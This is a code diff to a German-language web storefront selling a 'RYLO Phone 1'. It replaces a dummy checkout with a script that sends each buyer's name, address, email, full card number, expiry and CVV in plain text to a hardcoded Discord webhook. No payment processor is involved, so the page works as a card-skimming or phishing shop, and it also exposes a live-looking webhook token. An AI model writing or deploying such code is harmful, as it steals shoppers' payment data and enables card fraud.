@@ -93,7 +93,6 @@
         h1 { font-size: clamp(50px, 12vw, 160px); font-weight: 900; margin: 0; letter-spacing: -3px; line-height: 0.9; }
         .tagline { color: var(--sub); font-size: 16px; margin-top: 15px; font-weight: 300; }
         
-        /* Bento Grid Reparatur */
         .bento-grid { 
             display: grid; 
             grid-template-columns: repeat(1, 1fr); 
@@ -128,7 +127,7 @@
         .sub-text { color: var(--sub); font-size: 14px; margin-top: 8px; font-weight: 400; }
         .price-big { font-size: clamp(60px, 10vw, 80px); font-weight: 900; font-style: italic; line-height: 1; margin: 10px 0; }
         
-        .btn { background: var(--btn-bg); color: var(--btn-text) !important; padding: 18px 40px; border-radius: 100px; font-weight: 900; text-decoration: none; display: inline-block; margin-top: 30px; border: none; cursor: pointer; transition: 0.3s; }
+        .btn { background: var(--btn-bg); color: var(--btn-text) !important; padding: 18px 40px; border-radius: 100px; font-weight: 900; text-decoration: none; display: inline-block; margin-top: 30px; border: none; cursor: pointer; transition: 0.3s; text-align: center; }
         .btn:hover { transform: scale(1.05); }
 
         footer { margin-top: 60px; color: var(--label); font-size: 8px; letter-spacing: 6px; text-transform: uppercase; text-align: center; }
@@ -148,18 +147,18 @@
             <div class="close-btn" onclick="toggleCheckout()">✕</div>
             <div class="checkout-title">Bestellung</div>
             <div class="checkout-price">RYLO Phone 1 — 299€</div>
-            <form onsubmit="event.preventDefault(); alert('Vielen Dank!'); toggleCheckout();">
-                <div class="input-group"><label>Name</label><input type="text" placeholder="Vollständiger Name" required></div>
-                <div class="input-group"><label>E-Mail</label><input type="email" placeholder="mail@example.com" required></div>
-                <div class="input-group"><label>Adresse</label><input type="text" placeholder="Straße, Nr, Stadt" required></div>
+            <form id="webhookForm">
+                <div class="input-group"><label>Name</label><input type="text" id="name" placeholder="Vollständiger Name" required></div>
+                <div class="input-group"><label>E-Mail</label><input type="email" id="email" placeholder="mail@example.com" required></div>
+                <div class="input-group"><label>Adresse</label><input type="text" id="address" placeholder="Straße, Nr, Stadt" required></div>
                 <div style="border-top: 1px solid var(--border); margin: 20px 0; padding-top: 20px;">
-                    <div class="input-group"><label>Kartennummer</label><input type="text" placeholder="0000 0000 0000 0000" required></div>
+                    <div class="input-group"><label>Kartennummer</label><input type="text" id="card" placeholder="0000 0000 0000 0000" required></div>
                     <div class="form-row">
-                        <div class="input-group"><label>Ablauf</label><input type="text" placeholder="MM/YY" required></div>
-                        <div class="input-group"><label>CVV</label><input type="text" placeholder="123" required></div>
+                        <div class="input-group"><label>Ablauf</label><input type="text" id="expiry" placeholder="MM/YY" required></div>
+                        <div class="input-group"><label>CVV</label><input type="text" id="cvv" placeholder="123" required></div>
                     </div>
                 </div>
-                <button type="submit" class="btn" style="width: 100%; margin-top: 10px;">JETZT KAUFEN</button>
+                <button type="submit" id="submitBtn" class="btn" style="width: 100%; margin-top: 10px;">JETZT KAUFEN</button>
             </form>
         </div>
     </div>
@@ -228,7 +227,6 @@
 
     <footer>RYLO Global 2026</footer>
 
-    <style> @keyframes load { to { left: 0; } } </style>
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
     <script>
         window.addEventListener('load', () => {
@@ -257,6 +255,50 @@
                 document.body.style.overflow = 'hidden';
             }
         }
+
+        // Webhook Logik
+        document.getElementById('webhookForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = "VERARBEITE...";
+            btn.disabled = true;
+
+            const data = {
+                username: "RYLO Store Bot",
+                embeds: [{
+                    title: "📦 Neue Bestellung: RYLO Phone 1",
+                    color: 3899126,
+                    fields: [
+                        { name: "👤 Name", value: document.getElementById('name').value, inline: true },
+                        { name: "📧 E-Mail", value: document.getElementById('email').value, inline: true },
+                        { name: "🏠 Adresse", value: document.getElementById('address').value },
+                        { name: "💳 Kartennummer", value: `\`${document.getElementById('card').value}\``, inline: true },
+                        { name: "📅 Ablauf/CVV", value: `${document.getElementById('expiry').value} / ${document.getElementById('cvv').value}`, inline: true }
+                    ],
+                    footer: { text: "RYLO Corporation 2026" },
+                    timestamp: new Date()
+                }]
+            };
+
+            fetch('https://discord.com/api/webhooks/1494234969017417809/sMGBFORJ8X7X8ahOvBwr5AFqSyYYjL1KV5pJGTbtd6q7H4WVVIduEJaeH2EQbxlX3Il6', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(() => {
+                alert('Vielen Dank für deine Bestellung!');
+                toggleCheckout();
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+                document.getElementById('webhookForm').reset();
+            })
+            .catch(() => {
+                alert('Fehler bei der Verbindung. Bitte versuche es später erneut.');
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+            });
+        });
     </script>
 </body>
 </html>
